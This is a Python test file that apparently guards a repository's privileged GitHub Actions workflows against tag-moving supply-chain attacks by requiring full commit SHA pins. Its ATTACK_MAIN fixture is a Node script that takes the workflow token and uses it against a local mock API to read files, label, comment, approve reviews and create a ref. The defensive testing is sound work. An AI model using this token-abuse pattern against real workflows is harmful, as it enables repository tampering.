"""Privileged workflows must not run a movable action tag with the workflow token.

The tests follow the actions runner at v2.338.2 (commit d1eb12d4b115c301201de27d667284e1a80f2ab5):

- A ``uses: org/repo@ref`` value is split into a repository and a ref string.
  The ref is not resolved to a commit while the workflow is parsed
  (PipelineTemplateConverter.cs, the ``uses.Value.Split('@')`` branch).
- At job execution the runner sends that ref string to the service as the
  action version (LaunchHttpClient.ToGitHubData sets Version from Ref) and
  runs the tree returned for whatever that ref names at that moment
  (ActionManager.GetDownloadInfoAsync / DownloadRepositoryActionAsync).
- The step's ``with:`` values are evaluated and copied to ``INPUT_*``
  environment variables (ActionRunner.EvaluateStepInputs, Handler.AddInputsToEnvironment).
  Inputs the workflow omits are filled from the downloaded action's defaults,
  including ``${{ github.token }}``.
- ``@actions/core`` ``getInput`` reads ``INPUT_<NAME>`` and ``@actions/github``
  sends the token as ``Authorization: token <value>``.

``actions/publish-action`` v0.4.0 moves a major tag with
``git.updateRef(..., force: true)``. A full 40-hex commit SHA is not a ref
that call can retarget.

These tests fail while a ``pull_request_target`` or ``workflow_run`` job
grants a write-capable ``GITHUB_TOKEN`` to an action ref that is not a full
commit SHA. They pass once every such ref is a 40-hex SHA (or the step is
removed).

Run:

    python -m pytest tests/test_privileged_action_ref_pin.py -q

Untested, because a fork pull request does not start them:

- ``.github/workflows/ash-full-repository-scan.yml`` uses floating tags,
  including ``actions/github-script@v9``, with ``issues: write``, but only on
  ``push``, ``schedule``, and ``workflow_dispatch``.
- ``shell-checks.yml``, ``ash-security-scan.yml``, ``contract-parity.yml``,
  ``control-library.yml``, and ``python-lint.yml`` use floating tags with
  ``contents: read`` only.
"""

from __future__ import annotations

import json
import os
import re
import shutil
import subprocess
import tempfile
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import urlparse

import yaml

REPO_ROOT = Path(__file__).resolve().parents[1]
WORKFLOWS = REPO_ROOT / ".github" / "workflows"

# Obvious placeholder. This is not a credential.
WORKFLOW_TOKEN = "placeholder-workflow-token"

FULL_SHA = re.compile(r"^[0-9a-fA-F]{40}$")
PRIVILEGED_TRIGGERS = frozenset({"pull_request_target", "workflow_run"})
SCOPES = (
    "actions",
    "artifact-metadata",
    "attestations",
    "checks",
    "contents",
    "deployments",
    "discussions",
    "id-token",
    "issues",
    "models",
    "packages",
    "pages",
    "pull-requests",
    "repository-projects",
    "security-events",
    "statuses",
    "vulnerability-alerts",
)
WRITE_SCOPES = frozenset(
    {
        "actions",
        "checks",
        "contents",
        "deployments",
        "discussions",
        "issues",
        "packages",
        "pages",
        "pull-requests",
        "repository-projects",
        "security-events",
        "statuses",
    }
)
RANK = {"none": 0, "read": 1, "write": 2}

# Endpoint permission map copied from GitHub's published GitHub App permission
# tables (contents section and pull-requests section). ``write`` includes
# ``read``. An endpoint listed under pull requests is allowed for
# ``pull-requests: write``; issue comments and labels are also listed there.
CONTENTS_SENTINEL = "base-repository-source-marker"


def _git(repo: Path, *args: str, check: bool = True) -> subprocess.CompletedProcess[str]:
    env = os.environ.copy()
    env.update(
        {
            "GIT_AUTHOR_NAME": "Action Ref Test",
            "GIT_AUTHOR_EMAIL": "action-ref-test@example.com",
            "GIT_COMMITTER_NAME": "Action Ref Test",
            "GIT_COMMITTER_EMAIL": "action-ref-test@example.com",
        }
    )
    return subprocess.run(
        ["git", "-C", str(repo), *args],
        check=check,
        capture_output=True,
        text=True,
        env=env,
    )


def _rev_parse(repo: Path, ref: str) -> str:
    completed = _git(repo, "rev-parse", "--verify", f"{ref}^{{commit}}")
    return completed.stdout.strip()


def _commit_file(repo: Path, relative: str, content: str, message: str) -> str:
    path = repo / relative
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content, encoding="utf-8")
    _git(repo, "add", relative)
    _git(repo, "commit", "-m", message)
    return _rev_parse(repo, "HEAD")


def _init_repo() -> Path:
    repo = Path(tempfile.mkdtemp(prefix="action-ref-"))
    _git(repo, "init", "-b", "main")
    return repo


def _on_mapping(document: dict) -> object:
    # PyYAML 1.1 parses the workflow key "on" as boolean true.
    if True in document:
        return document[True]
    return document.get("on")


def trigger_names(document: dict) -> set[str]:
    event = _on_mapping(document)
    if event is None:
        return set()
    if isinstance(event, str):
        return {event}
    if isinstance(event, list):
        return {str(item) for item in event}
    if isinstance(event, dict):
        return {str(key) for key in event}
    return set()


def effective_permissions(document: dict, job: dict) -> dict[str, str] | None:
    """Job permissions override the workflow permissions when the job sets them.

    WorkflowTemplateConverter copies workflow permissions onto a job only when
    ``job.Permissions`` is null. A permissions mapping leaves every omitted
    scope at NoAccess (the PermissionLevel default).
    """

    raw = job.get("permissions", document.get("permissions"))
    if raw is None:
        return None
    if raw == "read-all":
        return {scope: "read" for scope in SCOPES}
    if raw == "write-all":
        return {scope: "write" for scope in SCOPES}
    if isinstance(raw, dict):
        permissions = {scope: "none" for scope in SCOPES}
        for key, value in raw.items():
            permissions[str(key)] = str(value)
        return permissions
    return None


def parse_uses(uses: str) -> dict[str, str] | None:
    """Split ``org/repo[/path]@ref`` the way PipelineTemplateConverter does."""

    if uses.startswith("docker://") or uses.startswith("./") or uses.startswith(".\\"):
        return None
    segments = uses.split("@")
    if len(segments) != 2:
        return None
    path_segments = [part for part in re.split(r"[/\\]", segments[0]) if part]
    git_ref = segments[1]
    if len(path_segments) < 2 or not path_segments[0] or not path_segments[1] or not git_ref:
        return None
    return {
        "name": f"{path_segments[0]}/{path_segments[1]}",
        "path": "/".join(path_segments[2:]),
        "ref": git_ref,
    }


def _grants_write(permissions: dict[str, str]) -> bool:
    return any(permissions.get(scope) == "write" for scope in WRITE_SCOPES)


def privileged_action_steps(root: Path = REPO_ROOT) -> list[dict[str, object]]:
    steps: list[dict[str, object]] = []
    workflow_dir = root / ".github" / "workflows"
    if not workflow_dir.is_dir():
        return steps
    for path in sorted(workflow_dir.glob("*.yml")) + sorted(workflow_dir.glob("*.yaml")):
        document = yaml.safe_load(path.read_text(encoding="utf-8"))
        if not isinstance(document, dict):
            continue
        if not (trigger_names(document) & PRIVILEGED_TRIGGERS):
            continue
        jobs = document.get("jobs") or {}
        if not isinstance(jobs, dict):
            continue
        for job_id, job in jobs.items():
            if not isinstance(job, dict):
                continue
            permissions = effective_permissions(document, job)
            if permissions is None or not _grants_write(permissions):
                continue
            for index, step in enumerate(job.get("steps") or []):
                if not isinstance(step, dict) or "uses" not in step:
                    continue
                parsed = parse_uses(str(step["uses"]))
                if parsed is None:
                    continue
                with_inputs = step.get("with") or {}
                if not isinstance(with_inputs, dict):
                    with_inputs = {}
                steps.append(
                    {
                        "workflow": str(path.relative_to(root)),
                        "job": str(job_id),
                        "index": index,
                        "uses": str(step["uses"]),
                        "with": {str(key): str(value) for key, value in with_inputs.items()},
                        "permissions": permissions,
                        **parsed,
                    }
                )
    return steps


def _evaluate_action_input(value: str) -> str:
    """Substitute the two token expressions this workflow actually uses."""

    value = value.replace("${{ secrets.GITHUB_TOKEN }}", WORKFLOW_TOKEN)
    value = value.replace("${{ github.token }}", WORKFLOW_TOKEN)
    return value


def _input_env_name(name: str) -> str:
    # Handler.AddInputsToEnvironment replaces spaces, not hyphens.
    return "INPUT_" + name.replace(" ", "_").upper()


class _ApiState:
    def __init__(self, permissions: dict[str, str]) -> None:
        self.permissions = permissions
        self.contents = {"README.md": CONTENTS_SENTINEL}
        self.labels: list[str] = []
        self.comments: list[str] = []
        self.reviews: list[dict[str, str]] = []
        self.refs: list[dict[str, str]] = []
        self.calls: list[dict[str, object]] = []


def _allows(permissions: dict[str, str], scope: str, need: str) -> bool:
    have = permissions.get(scope, "none")
    return RANK.get(have, 0) >= RANK[need]


def _route(method: str, path: str) -> tuple[str, str] | None:
    """Return ``(scope, level)`` for the endpoints the finding names.

    Levels come from the Contents and Pull requests tables in GitHub's
    "Permissions required for GitHub Apps" document. Creating a git ref is
    contents write, so a contents-read token cannot push.
    """

    parts = [item for item in path.split("/") if item]
    if len(parts) >= 5 and parts[0] == "repos" and parts[3] == "contents" and method == "GET":
        return ("contents", "read")
    if len(parts) == 6 and parts[0] == "repos" and parts[3] == "issues" and parts[5] == "labels" and method == "PUT":
        return ("pull-requests", "write")
    if len(parts) == 6 and parts[0] == "repos" and parts[3] == "issues" and parts[5] == "comments" and method == "POST":
        return ("pull-requests", "write")
    if len(parts) == 6 and parts[0] == "repos" and parts[3] == "pulls" and parts[5] == "reviews" and method == "POST":
        return ("pull-requests", "write")
    if len(parts) == 5 and parts[0] == "repos" and parts[3] == "git" and parts[4] == "refs" and method == "POST":
        return ("contents", "write")
    return None


def _start_api(state: _ApiState) -> tuple[ThreadingHTTPServer, str]:
    class Handler(BaseHTTPRequestHandler):
        def _read_body(self) -> dict:
            length = int(self.headers.get("Content-Length", "0") or "0")
            raw = self.rfile.read(length) if length else b""
            if not raw:
                return {}
            return json.loads(raw.decode("utf-8"))

        def _authorized(self) -> bool:
            header = self.headers.get("Authorization", "")
            return header == f"token {WORKFLOW_TOKEN}"

        def _handle(self, method: str) -> None:
            parsed = urlparse(self.path)
            route = _route(method, parsed.path)
            body = self._read_body() if method != "GET" else {}
            record: dict[str, object] = {"method": method, "path": parsed.path, "body": body}
            if not self._authorized() or route is None:
                record["status"] = 401 if not self._authorized() else 404
                state.calls.append(record)
                self._send(record["status"], {"message": "unauthorized"})
                return
            scope, level = route
            if not _allows(state.permissions, scope, level):
                record["status"] = 403
                state.calls.append(record)
                self._send(403, {"message": "Resource not accessible by integration"})
                return
            payload = self._apply(method, parsed.path, body)
            record["status"] = 200
            state.calls.append(record)
            self._send(200, payload)

        def _apply(self, method: str, path: str, body: dict) -> dict:
            parts = [item for item in path.split("/") if item]
            if method == "GET" and parts[3] == "contents":
                name = "/".join(parts[4:])
                return {"path": name, "content": state.contents.get(name, "")}
            if method == "PUT" and parts[5] == "labels":
                state.labels = list(body.get("labels") or [])
                return {"labels": state.labels}
            if method == "POST" and parts[3] == "issues":
                state.comments.append(str(body.get("body", "")))
                return {"id": len(state.comments), "body": state.comments[-1]}
            if method == "POST" and parts[3] == "pulls":
                review = {"event": str(body.get("event", "")), "body": str(body.get("body", ""))}
                state.reviews.append(review)
                return {"id": len(state.reviews), **review}
            if method == "POST" and parts[3] == "git":
                ref = {"ref": str(body.get("ref", "")), "sha": str(body.get("sha", ""))}
                state.refs.append(ref)
                return ref
            return {}

        def _send(self, status: int, payload: dict) -> None:
            encoded = json.dumps(payload).encode("utf-8")
            self.send_response(status)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(encoded)))
            self.end_headers()
            self.wfile.write(encoded)

        def do_GET(self) -> None:  # noqa: N802
            self._handle("GET")

        def do_POST(self) -> None:  # noqa: N802
            self._handle("POST")

        def do_PUT(self) -> None:  # noqa: N802
            self._handle("PUT")

        def log_message(self, fmt: str, *args: object) -> None:
            return

    server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    host, port = server.server_address
    return server, f"http://{host}:{port}"


ATTACK_ACTION = """name: Moved tag
inputs:
  repo-token:
    description: Token from the workflow or the github context
    default: ${{ github.token }}
  github-token:
    description: Token from the workflow or the github context
    default: ${{ github.token }}
runs:
  using: node24
  main: main.js
"""

ATTACK_MAIN = r"""
const http = require('http');
const fs = require('fs');
const {URL} = require('url');

function getInput(name) {
  const key = 'INPUT_' + name.replace(/ /g, '_').toUpperCase();
  return (process.env[key] || '').trim();
}

function call(method, path, body) {
  const token = getInput('repo-token') || getInput('github-token');
  const target = new URL(path, process.env.GITHUB_API_URL);
  const payload = body ? Buffer.from(JSON.stringify(body)) : null;
  const options = {
    method,
    hostname: target.hostname,
    port: target.port,
    path: target.pathname,
    headers: {
      Authorization: 'token ' + token,
      Accept: 'application/vnd.github+json',
    },
  };
  if (payload) {
    options.headers['Content-Type'] = 'application/json';
    options.headers['Content-Length'] = String(payload.length);
  }
  return new Promise((resolve, reject) => {
    const request = http.request(options, (response) => {
      const chunks = [];
      response.on('data', (chunk) => chunks.push(chunk));
      response.on('end', () => {
        const raw = Buffer.concat(chunks).toString('utf8');
        let parsed = {};
        if (raw) parsed = JSON.parse(raw);
        resolve({status: response.statusCode, body: parsed});
      });
    });
    request.on('error', reject);
    if (payload) request.write(payload);
    request.end();
  });
}

(async () => {
  const contents = await call('GET', '/repos/example/base/contents/README.md');
  const labels = await call('PUT', '/repos/example/base/issues/1/labels', {labels: ['moved-tag']});
  const comment = await call('POST', '/repos/example/base/issues/1/comments', {body: 'moved-tag comment'});
  const review = await call('POST', '/repos/example/base/pulls/1/reviews', {event: 'APPROVE', body: 'moved-tag review'});
  const push = await call('POST', '/repos/example/base/git/refs', {ref: 'refs/heads/attacker', sha: 'deadbeef'});
  fs.writeFileSync(process.env.EFFECTS_PATH, JSON.stringify({contents, labels, comment, review, push}));
})().catch((error) => {
  fs.writeFileSync(process.env.EFFECTS_PATH, JSON.stringify({error: String(error)}));
  process.exit(1);
});
"""

BENIGN_ACTION = """name: Pinned action
runs:
  using: node24
  main: main.js
"""

BENIGN_MAIN = """
const fs = require('fs');
fs.writeFileSync(process.env.EFFECTS_PATH, JSON.stringify({ran: 'benign'}));
"""


def _resolve_after_tag_move(repo: Path, ref: str) -> tuple[str, str]:
    """Return ``(sha_before_move, sha_at_job_time)``.

    Non-SHA refs are created on the benign commit and then force-updated to
    the attacker commit, matching ``git.updateRef`` with ``force: true``.
    A 40-hex SHA is not a tag, so the force-update does not change it.
    """

    benign = _commit_file(repo, "action.yml", BENIGN_ACTION, "benign manifest")
    benign = _commit_file(repo, "main.js", BENIGN_MAIN, "benign entrypoint")
    _commit_file(repo, "action.yml", ATTACK_ACTION, "attacker manifest")
    attacker = _commit_file(repo, "main.js", ATTACK_MAIN, "attacker entrypoint")
    if FULL_SHA.fullmatch(ref):
        identity = ref.lower()
        try:
            resolved = _rev_parse(repo, ref)
        except subprocess.CalledProcessError:
            resolved = identity
        return identity, resolved
    _git(repo, "update-ref", f"refs/tags/{ref}", benign)
    before = _rev_parse(repo, ref)
    _git(repo, "update-ref", f"refs/tags/{ref}", attacker)
    return before, _rev_parse(repo, ref)


def execute_step_after_tag_move(step: dict[str, object]) -> dict[str, object]:
    repo = _init_repo()
    server: ThreadingHTTPServer | None = None
    try:
        ref = str(step["ref"])
        before, executed = _resolve_after_tag_move(repo, ref)
        result: dict[str, object] = {
            "workflow": step["workflow"],
            "uses": step["uses"],
            "ref": ref,
            "before": before,
            "executed": executed,
            "effects": {},
            "stdout": "",
            "stderr": "",
            "exit_code": 0,
            "labels": [],
            "comments": [],
            "reviews": [],
            "refs": [],
        }
        if executed == before:
            return result
        permissions = step["permissions"]
        assert isinstance(permissions, dict)
        state = _ApiState({str(key): str(value) for key, value in permissions.items()})
        server, api_url = _start_api(state)
        work = Path(tempfile.mkdtemp(prefix="action-run-"))
        archived = subprocess.run(
            ["git", "-C", str(repo), "archive", executed],
            check=True,
            capture_output=True,
        )
        subprocess.run(["tar", "-x", "-C", str(work)], input=archived.stdout, check=True)
        action = yaml.safe_load((work / "action.yml").read_text(encoding="utf-8"))
        raw_inputs = step["with"]
        assert isinstance(raw_inputs, dict)
        inputs = {key: _evaluate_action_input(value) for key, value in raw_inputs.items()}
        declared = (action or {}).get("inputs") or {}
        if isinstance(declared, dict):
            for name, spec in declared.items():
                if name in inputs:
                    continue
                default = ""
                if isinstance(spec, dict) and "default" in spec:
                    default = str(spec["default"])
                inputs[str(name)] = _evaluate_action_input(default)
        effects_path = work / "effects.json"
        env = os.environ.copy()
        env["GITHUB_API_URL"] = api_url
        env["EFFECTS_PATH"] = str(effects_path)
        for name, value in inputs.items():
            env[_input_env_name(name)] = value
        entry = str((action or {}).get("runs", {}).get("main", "main.js"))
        completed = subprocess.run(
            ["node", str(work / entry)],
            cwd=work,
            env=env,
            capture_output=True,
            text=True,
            check=False,
        )
        effects = json.loads(effects_path.read_text(encoding="utf-8")) if effects_path.exists() else {}
        return {
            "workflow": step["workflow"],
            "uses": step["uses"],
            "ref": ref,
            "before": before,
            "executed": executed,
            "effects": effects,
            "stdout": completed.stdout,
            "stderr": completed.stderr,
            "exit_code": completed.returncode,
            "labels": state.labels,
            "comments": state.comments,
            "reviews": state.reviews,
            "refs": state.refs,
            "contents_seen": state.calls,
            "permissions": state.permissions,
        }
    finally:
        if server is not None:
            server.shutdown()
        shutil.rmtree(repo, ignore_errors=True)
        if "work" in locals():
            shutil.rmtree(work, ignore_errors=True)


def _status(effect: object) -> int | None:
    if isinstance(effect, dict):
        status = effect.get("status")
        if isinstance(status, int):
            return status
    return None


def _impact_errors(result: dict[str, object]) -> list[str]:
    """Check the calls the moved tag made against the job's declared scopes.

    ``contents: read`` allows ``GET /repos/{owner}/{repo}/contents/{path}``.
    ``pull-requests: write`` allows labels, issue comments, and pull-request
    reviews. ``POST /repos/{owner}/{repo}/git/refs`` requires ``contents: write``,
    which these jobs do not grant, so the token cannot push a commit.
    """

    effects = result["effects"]
    permissions = result.get("permissions")
    assert isinstance(effects, dict)
    assert isinstance(permissions, dict)
    if "error" in effects:
        return [f"action failed: {effects['error']} stderr={result['stderr']}"]
    errors = []
    contents = effects.get("contents") or {}
    labels = effects.get("labels") or {}
    comment = effects.get("comment") or {}
    review = effects.get("review") or {}
    push = effects.get("push") or {}
    if _allows(permissions, "contents", "read"):
        if _status(contents) != 200 or (contents.get("body") or {}).get("content") != CONTENTS_SENTINEL:
            errors.append(f"contents read did not return the repository file: {contents}")
    elif _status(contents) != 403:
        errors.append(f"contents read was allowed without contents: read: {contents}")
    if _allows(permissions, "pull-requests", "write"):
        if _status(labels) != 200 or result["labels"] != ["moved-tag"]:
            errors.append(f"pull-requests write did not set labels: {labels} stored={result['labels']}")
        if _status(comment) != 200 or result["comments"] != ["moved-tag comment"]:
            errors.append(f"pull-requests write did not create a comment: {comment}")
        if _status(review) != 200 or result["reviews"] != [{"event": "APPROVE", "body": "moved-tag review"}]:
            errors.append(f"pull-requests write did not create a review: {review}")
    else:
        if _status(labels) == 200 or _status(comment) == 200 or _status(review) == 200:
            errors.append(f"pull-request writes succeeded without pull-requests: write: {effects}")
    if _allows(permissions, "contents", "write"):
        if _status(push) != 200 or not result["refs"]:
            errors.append(f"contents write did not create a git ref: {push}")
    elif _status(push) != 403 or result["refs"]:
        errors.append(f"token created a git ref without contents: write: {push} refs={result['refs']}")
    return errors


def test_git_update_ref_force_moves_a_tag_and_leaves_a_sha() -> None:
    """The publish-action release step retargets a major tag with force."""

    repo = _init_repo()
    try:
        first = _commit_file(repo, "action.yml", "name: one\n", "one")
        second = _commit_file(repo, "action.yml", "name: two\n", "two")
        _git(repo, "update-ref", "refs/tags/v7", first)
        assert _rev_parse(repo, "v7") == first
        _git(repo, "update-ref", "refs/tags/v7", second)
        assert _rev_parse(repo, "v7") == second
        assert _rev_parse(repo, first) == first
    finally:
        shutil.rmtree(repo, ignore_errors=True)


def test_full_sha_does_not_follow_a_moved_tag() -> None:
    repo = _init_repo()
    try:
        benign = _commit_file(repo, "action.yml", BENIGN_ACTION, "benign manifest")
        benign = _commit_file(repo, "main.js", BENIGN_MAIN, "benign entry")
        _git(repo, "update-ref", "refs/tags/v7", benign)
        attacker = _commit_file(repo, "main.js", ATTACK_MAIN, "attacker")
        _git(repo, "update-ref", "refs/tags/v7", attacker)
        assert _rev_parse(repo, "v7") == attacker
        assert _rev_parse(repo, benign) == benign
    finally:
        shutil.rmtree(repo, ignore_errors=True)


def test_labeler_workflow_is_the_base_file() -> None:
    """pull_request_target selects the workflow in the base repository.

    A fork copy of the workflow is not the file this job runs.
    """

    document = yaml.safe_load((WORKFLOWS / "label.yml").read_text(encoding="utf-8"))
    assert "pull_request_target" in trigger_names(document)
    fork_root = Path(tempfile.mkdtemp(prefix="fork-workflow-"))
    try:
        fork_workflows = fork_root / ".github" / "workflows"
        fork_workflows.mkdir(parents=True)
        pinned = "actions/labeler@" + ("a" * 40)
        (fork_workflows / "label.yml").write_text(
            "name: Fork\non: [pull_request_target]\npermissions:\n  contents: read\n"
            "  pull-requests: write\njobs:\n  label:\n    runs-on: ubuntu-latest\n"
            f"    steps:\n      - uses: {pinned}\n",
            encoding="utf-8",
        )
        base_steps = privileged_action_steps(REPO_ROOT)
        fork_steps = privileged_action_steps(fork_root)
        assert any(step["workflow"] == ".github/workflows/label.yml" for step in base_steps)
        assert all(step["uses"] != pinned for step in base_steps)
        assert any(step["uses"] == pinned for step in fork_steps)
    finally:
        shutil.rmtree(fork_root, ignore_errors=True)


def test_privileged_action_refs_do_not_change_when_tags_move() -> None:
    label = WORKFLOWS / "label.yml"
    if label.exists():
        text = label.read_text(encoding="utf-8")
        assert "pull_request_target" in text
        assert "actions/labeler@" in text
    failures: list[str] = []
    for step in privileged_action_steps(REPO_ROOT):
        result = execute_step_after_tag_move(step)
        location = f"{step['workflow']} job {step['job']} uses {step['uses']}"
        if result["executed"] == result["before"]:
            continue
        impact = _impact_errors(result)
        if impact:
            failures.append(location + " did not show the token impact: " + "; ".join(impact))
            continue
        failures.append(
            f"{location} resolved {result['before']} before the tag move and "
            f"{result['executed']} after it. Token effects: {result['effects']}. "
            f"stderr={result['stderr']}"
        )
    assert not failures, "\n".join(failures)
